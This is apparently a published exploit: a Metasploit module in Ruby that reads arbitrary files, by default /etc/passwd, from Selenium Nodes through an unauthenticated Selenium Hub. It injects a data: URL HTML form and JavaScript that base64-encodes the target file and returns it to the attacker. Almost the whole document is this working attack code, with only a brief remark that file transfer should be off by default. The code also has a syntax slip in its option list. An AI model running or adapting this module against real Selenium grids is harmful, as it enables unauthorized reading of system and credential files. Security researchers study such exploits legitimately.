# Exploit Title: Selenium Node Download
# Date: 3/7/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: This creates and inline HTML form with a file upload field and some java script that base64 encodes the uploaded file into a variable. A file is uploaded with “send_keys”, and this variable is then dumped and decoded in Ruby. This was tested with Geckodriver/Firefox, but should work with all browsers that have a Webdriver.

# INSTALL: To install on Debian based systems, "apt-get install ruby-selenium-webdriver". Then copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt). Set "LOCAL_FILE" to the path and name to save the remote file too. If this isnt set, the remote file's contents will be dumped to stdout.

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Download',
      'Description'    => %q{
        This creates and inline HTML form with a file upload field and some java script that base64 encodes the uploaded file into a variable. A file is uploaded with “send_keys”, and this variable is then dumped and decoded in Ruby. This was tested with Geckodriver/Firefox, but should work with all browsers that have a Webdriver.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('URL', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The Remote File to Download', '/etc/passwd'])
        OptString.new('LOCAL_FILE', [false, 'Save the remote file to this name and path. If not set, the REMOTE_FILE will be dumped to stdout.'])
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox'])
      ])
  end

  def exploit
    begin
        require 'selenium-webdriver'
    rescue LoadError
        print_error("Failed to load selenium-webdriver. Try 'apt-get install ruby-selenium-webdriver'")
        return
    end

    url = datastore['URL']
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']
    browser = datastore['BROWSER']

    driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }

    begin
      driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
      driver.find_element(id: 'f').send_keys(remote_file) # Load local file into input field (and therefor "inf")
      js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
      if js_return
        decoded_contents = Base64.decode64(js_return.split(',')[1])

        if local_file
          File.open(local_file, 'wb') do |f|
              f.write(decoded_contents)
          end
        else
          print(decoded_contents)
        end
      else
        print_error('Cannot Read: %s', remote_file)
      end
    rescue
      print_error('Doesnt Exist: %s', remote_file)
    end

    driver.quit
  end

end
